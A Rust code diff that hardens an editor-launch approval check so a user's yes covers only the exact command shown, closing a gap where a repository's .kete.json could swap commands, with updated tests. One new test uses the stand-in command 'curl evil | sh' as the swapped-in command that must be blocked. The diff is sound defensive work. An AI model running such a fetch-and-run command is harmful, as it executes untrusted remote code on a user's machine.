@@ -215,15 +215,17 @@ pub struct OpenOutcome {
 
 /// Whether Open in editor may run now, for the repo at `main`: a command
 /// from the user's own setting always may; one from a .kete.json only once
-/// allowed for this repo. `approve` allows it, and the approval is kept in
-/// the window's prefs in the layers at `path` / `local`, so the same
-/// command doesn't ask again (a changed one does).
+/// allowed for this repo. `approved` is the command the window showed and
+/// the user said yes to: it allows the command only when it is the one
+/// resolved now (the .kete.json can change between the ask and the yes),
+/// and the approval is kept in the window's prefs in the layers at `path` /
+/// `local`, so the same command doesn't ask again (a changed one does).
 pub fn open_allowed(
     path: &Path,
     local: &Path,
     main: &Path,
     open: &OpenCommand,
-    approve: bool,
+    approved: Option<&str>,
 ) -> Res<bool> {
     use nebula_config::desktop::DesktopPrefs;
     if !open.from_file {
@@ -233,7 +235,7 @@ pub fn open_allowed(
     if DesktopPrefs::load_at(path, local).open_approved(&repo, &open.command) {
         return Ok(true);
     }
-    if !approve {
+    if approved != Some(open.command.as_str()) {
         return Ok(false);
     }
     DesktopPrefs::update_in(path, local, |p| {
@@ -336,12 +338,12 @@ pub async fn set_project_path(
 pub async fn open_worktree(
     client: State<'_, Arc<Client>>,
     worktree: String,
-    approve: Option<bool>,
+    approve: Option<String>,
 ) -> Res<OpenOutcome> {
     let (path, main) = checkout(&client, &worktree)?;
     let open = open_command_for(&nebula_config::Config::load(), &path, &main)?;
     let (config, local) = nebula_config::layer_paths();
-    if !open_allowed(&config, &local, &main, &open, approve.unwrap_or(false))? {
+    if !open_allowed(&config, &local, &main, &open, approve.as_deref())? {
         return Ok(OpenOutcome {
             command: open.command,
             opened: false,
@@ -568,16 +570,49 @@ mod tests {
             from_file,
         };
         // The user's own setting never asks.
-        assert!(open_allowed(&path, &local, &main, &open("code .", false), false).unwrap());
+        assert!(open_allowed(&path, &local, &main, &open("code .", false), None).unwrap());
         assert!(!path.exists(), "nothing recorded for a setting");
         // A repo file's asks until allowed, then not again.
         let file = open("code .", true);
-        assert!(!open_allowed(&path, &local, &main, &file, false).unwrap());
-        assert!(open_allowed(&path, &local, &main, &file, true).unwrap());
-        assert!(open_allowed(&path, &local, &main, &file, false).unwrap());
+        assert!(!open_allowed(&path, &local, &main, &file, None).unwrap());
+        assert!(open_allowed(&path, &local, &main, &file, Some("code .")).unwrap());
+        assert!(open_allowed(&path, &local, &main, &file, None).unwrap());
         // Another repo, or a changed command, asks again.
-        assert!(!open_allowed(&path, &local, &other, &file, false).unwrap());
-        assert!(!open_allowed(&path, &local, &main, &open("make open", true), false).unwrap());
+        assert!(!open_allowed(&path, &local, &other, &file, None).unwrap());
+        assert!(!open_allowed(&path, &local, &main, &open("make open", true), None).unwrap());
+    }
+
+    /// The yes is for the command the window showed: if the repo's
+    /// .kete.json changed between the ask and the yes, the new command is
+    /// neither run nor recorded.
+    #[test]
+    fn an_approval_only_covers_the_command_that_was_shown() {
+        let dir = tempfile::tempdir().unwrap();
+        let (path, local) = (
+            dir.path().join("config.json"),
+            dir.path().join("config.local.json"),
+        );
+        let main = dir.path().join("repo");
+        let now = OpenCommand {
+            command: "curl evil | sh".into(),
+            from_file: true,
+        };
+        assert!(!open_allowed(&path, &local, &main, &now, Some("code .")).unwrap());
+        assert!(!open_allowed(&path, &local, &main, &now, None).unwrap());
+        assert!(
+            !open_allowed(
+                &path,
+                &local,
+                &main,
+                &OpenCommand {
+                    command: "code .".into(),
+                    from_file: true
+                },
+                None
+            )
+            .unwrap(),
+            "the shown command was not recorded either"
+        );
     }
 
     #[test]
